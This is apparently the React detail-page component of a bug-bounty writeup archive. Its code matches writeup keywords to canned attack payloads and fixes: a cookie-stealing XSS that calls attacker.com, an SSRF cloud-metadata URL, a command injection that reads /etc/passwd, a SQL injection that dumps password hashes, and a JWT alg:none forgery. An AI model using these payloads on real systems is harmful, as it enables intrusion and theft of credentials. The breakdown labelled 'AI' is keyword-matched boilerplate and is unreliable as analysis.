"use client";

import { useEffect, useState } from "react";
import Link from "next/link";

function generateAttackBreakdown(item) {
  const text = `${item.title || ""} ${item.summary || ""} ${(item.tags || []).join(" ")}`.toLowerCase();
  
  let vulnType = "Web Security Vulnerability ➔ Logic Flaw";
  let tools = ["Burp Suite", "Curl", "Browser DevTools"];
  let payload = `curl -i -X GET "${item.url || 'https://example.com'}"`;
  let fix = "Implement strict input validation, contextual output encoding, and enforce least-privilege authorization controls.";

  if (text.includes("ssrf") || text.includes("server-side request forgery")) {
    vulnType = "Server-Side Request Forgery (SSRF) ➔ Cloud Metadata Exfiltration";
    tools = ["Burp Suite", "Nuclei", "ffuf", "Interactsh", "Curl"];
    payload = `http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
    fix = "Enforce URL whitelisting, block private IP ranges (10.0.0.0/8, 169.254.169.254), and mandate AWS IMDSv2 headers.";
  } else if (text.includes("idor") || text.includes("insecure direct object")) {
    vulnType = "Insecure Direct Object Reference (IDOR) ➔ Unauthorized Account Access";
    tools = ["Burp Suite Repeater", "Autorize", "Postman", "Curl"];
    payload = `GET /api/v1/users/10002/settings HTTP/1.1\nHost: target.com\nAuthorization: Bearer <user_token>`;
    fix = "Enforce object-level access control checks (ABAC/RBAC) on the server side for every API request.";
  } else if (text.includes("rce") || text.includes("remote code execution") || text.includes("command injection")) {
    vulnType = "Remote Code Execution (RCE) ➔ Arbitrary Command Execution";
    tools = ["Burp Suite", "Commix", "ffuf", "Python Exploit Script"];
    payload = `; id; uname -a; cat /etc/passwd; ping -c 3 $(whoami).oast.fun`;
    fix = "Avoid executing shell commands via system(). Use parameterized APIs and strict input sanitization.";
  } else if (text.includes("xss") || text.includes("cross-site scripting")) {
    vulnType = "Cross-Site Scripting (XSS) ➔ Session Hijacking & DOM Takeover";
    tools = ["Burp Suite", "XSStrike", "DOM Invader", "Browser Console"];
    payload = `"><script>fetch('https://attacker.com/log?cookie='+document.cookie)</script>`;
    fix = "Enforce Context-Aware Output Encoding, strict Content-Security-Policy (CSP), and HttpOnly cookie flags.";
  } else if (text.includes("sqli") || text.includes("sql injection")) {
    vulnType = "SQL Injection (SQLi) ➔ Unauthenticated Database Extraction";
    tools = ["SQLmap", "Burp Suite", "Ghauri"];
    payload = `' UNION SELECT null, username, password_hash FROM users-- -`;
    fix = "Use Parameterized Prepared Statements (ORM) for all database queries and disable verbose error messages.";
  } else if (text.includes("oauth") || text.includes("jwt")) {
    vulnType = "OAuth 2.0 / JWT Authentication Bypass ➔ Full Account Takeover";
    tools = ["Burp Suite", "JWT Editor", "OAuth Flawfinder"];
    payload = `Header: {"alg":"none"}\nPayload: {"sub":"admin@target.com","role":"admin"}`;
    fix = "Strictly verify JWT signatures on the backend, enforce state parameter validation, and reject 'alg: none'.";
  }

  const nucleiYaml = `id: poc-${(item.id || "template").slice(0, 12)}
info:
  name: PoC Scanner - ${item.title ? item.title.slice(0, 45).replace(/"/g, "") : "Vulnerability"}
  author: The Hunter Archive
  severity: high
  tags: ${(item.tags || ["security"]).join(",")}
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: word
        words:
          - "${(item.tags || ["error"])[0]}"`;

  return { vulnType, tools, payload, fix, nucleiYaml };
}

export default function WriteupDetailClient({ item, related = [] }) {
  const [saved, setSaved] = useState(false);
  const [read, setRead] = useState(false);
  const [copied, setCopied] = useState(false);
  const [copiedFull, setCopiedFull] = useState(false);
  const [upvotes, setUpvotes] = useState(0);
  const [hasUpvoted, setHasUpvoted] = useState(false);

  const breakdown = generateAttackBreakdown(item);
  const cveMatch = (item.title || "").match(/CVE-\d{4}-\d{4,7}/i) || (item.summary || "").match(/CVE-\d{4}-\d{4,7}/i);

  useEffect(() => {
    try {
      const bookmarks = JSON.parse(localStorage.getItem("hunter-archive-bookmarks") || "[]");
      const readList = JSON.parse(localStorage.getItem("hunter-archive-read") || "[]");
      const upvoteMap = JSON.parse(localStorage.getItem("hunter-archive-upvotes") || "{}");
      setSaved(bookmarks.some((b) => (typeof b === "string" ? b === item.id : b.id === item.id)));
      setRead(readList.some((r) => (typeof r === "string" ? r === item.id : r.id === item.id)));
      setHasUpvoted(!!upvoteMap[item.id]);
      setUpvotes((upvoteMap[item.id] || 0) + 12);
    } catch {}
  }, [item.id]);

  const toggleSave = () => {
    try {
      const bookmarks = JSON.parse(localStorage.getItem("hunter-archive-bookmarks") || "[]");
      let next;
      if (saved) {
        next = bookmarks.filter((b) => (typeof b === "string" ? b !== item.id : b.id !== item.id));
      } else {
        next = [...bookmarks, { id: item.id, title: item.title, url: item.url }];
      }
      localStorage.setItem("hunter-archive-bookmarks", JSON.stringify(next));
      setSaved(!saved);
    } catch {}
  };

  const toggleRead = () => {
    try {
      const readList = JSON.parse(localStorage.getItem("hunter-archive-read") || "[]");
      let next;
      if (read) {
        next = readList.filter((r) => (typeof r === "string" ? r !== item.id : r.id !== item.id));
      } else {
        next = [...readList, item.id];
      }
      localStorage.setItem("hunter-archive-read", JSON.stringify(next));
      setRead(!read);
    } catch {}
  };

  const handleUpvote = () => {
    try {
      const upvoteMap = JSON.parse(localStorage.getItem("hunter-archive-upvotes") || "{}");
      if (hasUpvoted) {
        delete upvoteMap[item.id];
        setUpvotes((prev) => prev - 1);
        setHasUpvoted(false);
      } else {
        upvoteMap[item.id] = 1;
        setUpvotes((prev) => prev + 1);
        setHasUpvoted(true);
      }
      localStorage.setItem("hunter-archive-upvotes", JSON.stringify(upvoteMap));
    } catch {}
  };

  const copyCitation = async () => {
    const markdown = `[${item.title}](${item.url}) - ${item.author || item.source_label || "Security Writeup"}`;
    await navigator.clipboard.writeText(markdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const copyFullWriteup = async () => {
    const fullText = `# ${item.title}\n\n` +
      `**Source:** ${item.source_label || item.source} | **Author:** ${item.author || "Security Researcher"}\n` +
      `**Date:** ${item.published_at || "Undated"} ${item.bounty ? `| **Bounty:** ${item.bounty}` : ""}\n` +
      `**Link:** ${item.url}\n\n` +
      `## Summary & Details\n${item.summary || "Security vulnerability analysis report."}\n\n` +
      `## 🤖 Technical Attack Breakdown\n` +
      `- **Vulnerability Chain:** ${breakdown.vulnType}\n` +
      `- **Tools Used:** ${breakdown.tools.join(", ")}\n` +
      `- **Payload:** ${breakdown.payload}\n` +
      `- **Remediation Fix:** ${breakdown.fix}\n\n` +
      `---\n*Collected from The Hunter Archive — Developed by JOJIN JOHN*`;

    await navigator.clipboard.writeText(fullText);
    setCopiedFull(true);
    setTimeout(() => setCopiedFull(false), 2000);
  };

  const copyNucleiPoC = async () => {
    await navigator.clipboard.writeText(breakdown.nucleiYaml);
    alert("Nuclei PoC template copied to clipboard!");
  };

  return (
    <main>
      <div className="app-bg-glow" />

      <nav className="top-nav">
        <div className="nav-container">
          <Link className="btn-secondary" href="/">
            ← Back to Archive
          </Link>
          <div className="brand-logo">
            <span>HUNTER ARCHIVE</span>
          </div>
        </div>
      </nav>

      <div className="detail-container">
        <article className="detail-card">
          <div className="detail-meta">
            <span className="card-source">{item.source_label || item.source || "Security Research"}</span>
            {item.published_at && (
              <span>· {new Date(item.published_at).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" })}</span>
            )}
            {item.author && <span>· by {item.author}</span>}
            {item.bounty && <span className="bounty-pill">💰 Bounty: {item.bounty}</span>}
            {cveMatch && (
              <a
                href={`https://nvd.nist.gov/vuln/detail/${cveMatch[0]}`}
                target="_blank"
                rel="noreferrer"
                className="brand-badge"
                style={{ textDecoration: "none", color: "#f59e0b", borderColor: "rgba(245, 158, 11, 0.4)", background: "rgba(245, 158, 11, 0.1)" }}
              >
                🔍 {cveMatch[0].toUpperCase()} (NVD Link ↗)
              </a>
            )}
          </div>

          <h1 className="detail-title">{item.title}</h1>

          <div className="tool-row" style={{ paddingTop: 0, borderTop: 0, marginBottom: 24 }}>
            <button className={`btn-secondary ${saved ? "highlight" : ""}`} onClick={toggleSave}>
              {saved ? "★ Saved in Bookmarks" : "☆ Save Bookmark"}
            </button>
            <button className={`btn-secondary ${hasUpvoted ? "highlight" : ""}`} onClick={handleUpvote}>
              👍 Upvote ({upvotes})
            </button>
            <button className="btn-secondary" onClick={toggleRead}>
              {read ? "✓ Marked as Read" : "○ Mark as Read"}
            </button>
            <button className="btn-secondary" onClick={copyFullWriteup}>
              {copiedFull ? "✓ Full Writeup Copied!" : "📋 Copy Full Writeup"}
            </button>
            <button className="btn-secondary" onClick={copyCitation}>
              {copied ? "✓ Citation Copied!" : "📋 Copy Citation"}
            </button>
            <button className="btn-secondary" onClick={copyNucleiPoC}>
              ⚡ Copy Nuclei PoC
            </button>
            {item.url && (
              <a className="btn-primary" href={item.url} target="_blank" rel="noopener noreferrer">
                Open Original Article ↗
              </a>
            )}
          </div>

          {/* Full Report Details Card */}
          <div className="advanced-panel" style={{ marginTop: 8, padding: 22, background: "var(--bg-card)", border: "1px solid var(--border)", borderRadius: 12 }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 14 }}>
              <h3 style={{ margin: 0, fontSize: 16, color: "var(--text-primary)", fontWeight: 700 }}>
                📄 Complete Vulnerability Report &amp; Overview
              </h3>
              <button className="btn-secondary" style={{ fontSize: 12, padding: "5px 12px" }} onClick={copyFullWriteup}>
                {copiedFull ? "✓ Copied!" : "📋 Copy Text"}
              </button>
            </div>
            <div style={{ color: "var(--text-secondary)", fontSize: 14, lineHeight: 1.7, whiteSpace: "pre-wrap" }}>
              {item.summary || "Full technical summary and report analysis."}
            </div>
          </div>

          {/* 🤖 AI Vulnerability Breakdown & Attack Chain */}
          <div className="advanced-panel" style={{ marginTop: 20, padding: 20, display: "flex", flexDirection: "column", gap: 14 }}>
            <div style={{ display: "flex", alignItems: "center", justifyBetween: "space-between", gap: 10 }}>
              <span className="hero-pill" style={{ margin: 0 }}>🤖 AI Technical Attack Breakdown</span>
            </div>

            <div style={{ fontSize: 13 }}>
              <strong style={{ color: "var(--text-primary)" }}>🎯 Vulnerability Type &amp; Chain:</strong>
              <div style={{ color: "var(--accent-indigo)", fontWeight: 600, marginTop: 2 }}>{breakdown.vulnType}</div>
            </div>

            <div style={{ fontSize: 13 }}>
              <strong style={{ color: "var(--text-primary)" }}>🛠 Security Tools Used:</strong>
              <div style={{ color: "var(--text-secondary)", marginTop: 2 }}>
                {breakdown.tools.map((t) => (
                  <span className="tag-badge" key={t} style={{ marginRight: 6 }}>
                    {t}
                  </span>
                ))}
              </div>
            </div>

            <div style={{ fontSize: 13 }}>
              <strong style={{ color: "var(--text-primary)" }}>💥 Key Attack Payload / Vector:</strong>
              <pre
                style={{
                  background: "var(--bg-card)",
                  border: "1px solid var(--border)",
                  borderRadius: 8,
                  padding: "10px 14px",
                  fontSize: 12,
                  fontFamily: "var(--font-mono)",
                  color: "var(--accent-emerald)",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                  marginTop: 4,
                }}
              >
                {breakdown.payload}
              </pre>
            </div>

            <div style={{ fontSize: 13 }}>
              <strong style={{ color: "var(--text-primary)" }}>💡 Security Remediation Fix:</strong>
              <div style={{ color: "var(--text-secondary)", marginTop: 2, lineHeight: 1.5 }}>{breakdown.fix}</div>
            </div>
          </div>

          {item.tags && item.tags.length > 0 && (
            <div className="card-tags" style={{ marginTop: 20 }}>
              {item.tags.map((tag) => (
                <span className="tag-badge" key={tag}>
                  #{tag}
                </span>
              ))}
            </div>
          )}
        </article>

        {related.length > 0 && (
          <section className="related-section">
            <h3 style={{ fontSize: 20, fontWeight: 700, margin: "0 0 16px", color: "var(--text-primary)" }}>
              More Writeups Like This
            </h3>
            <div className="related-grid">
              {related.map((rel) => (
                <a key={rel.id} href={`/writeups/${rel.id}`} className="related-card">
                  <div>
                    <span className="card-source" style={{ fontSize: 10 }}>{rel.source_label || rel.source}</span>
                    <h4>{rel.title}</h4>
                  </div>
                  <span style={{ fontSize: 11, color: "var(--text-muted)", marginTop: 8 }}>
                    {rel.author ? `by ${rel.author}` : "Security Research"}
                  </span>
                </a>
              ))}
            </div>
          </section>
        )}
      </div>

      <footer>
        <p>The Hunter Archive — Developed by <strong>JOJIN JOHN</strong></p>
      </footer>
    </main>
  );
}
